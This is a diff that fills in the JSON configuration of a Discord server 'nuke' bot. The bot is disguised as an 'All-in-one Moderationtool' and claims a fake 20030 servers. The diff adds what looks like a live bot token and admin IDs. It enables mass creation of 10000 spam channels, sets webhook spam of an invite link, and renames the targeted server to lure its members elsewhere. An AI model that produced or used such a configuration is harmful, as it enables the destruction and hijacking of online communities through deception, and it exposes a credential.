@@ -1,22 +1,22 @@
 {
-    "token": "BOT TOKEN", 
-    "clientID": "APPLICATION/CLIENT ID FOUND ON DISCORD DEV PORTAL", 
-    "admins": ["IDS OF USERS THAT CAN OPEN NUKE PANEL"], 
-    "botName": "NAME OF THE BOT SET IN THE DISCORD DEV PORTAL", 
-    "fakeServers": "AMOUNT OF SERVERS THE BOT WILL SHOW IT IS IN", 
+    "token": "MTUyMzAxMTE3ODM3NTI4Mjc5OQ.GGoZT7.rJpMcoPQYLemiFWFZdqSPrKl7jGrdNVzVlekJM", 
+    "clientID": "1523011178375282799", 
+    "admins": ["1275418257733586944"], 
+    "botName": "All-in-one Moderationtool", 
+    "fakeServers": "20030", 
     "advancedOptions": {  
 
-        "enabled": false, 
+        "enabled": true, 
 
         "channels": {
-            "channelNames": "NAME OF CHANNEL THAT WILL BE SPAMMED", 
-            "amount": 50
+            "channelNames": "We have moved, please join our new server: College of Conquerors.", 
+            "amount": 10000
         },
 
         "webhook": {
-            "name": "NAME OF BOT THAT WILL SPAM THE CHANNELS", 
+            "name": "Moved!", 
             "avatar": "AVATAR OF SAID BOT, MUST BE DIRECT LINK", 
-            "message": "MESSAGE BOT WILL SPAM" 
+            "message": "https://discord.gg/GBDwfGngVU" 
         },
 
         "banning": {
@@ -25,7 +25,7 @@
         },
 
         "server": {
-            "nameChange": "CHANGES NAME OF THE SERVER", 
+            "nameChange": "Conquerors University (moved)", 
             "iconChange": "CHANGES SERVER ICON, MUST BE DIRECT LINK",
             "bannerChange": "CHANGES SERVER BANNER, ONLY WORKS ON LEVEL 2 BOOSTED SERVERS, MUST BE DIRECT LINK" 
         }
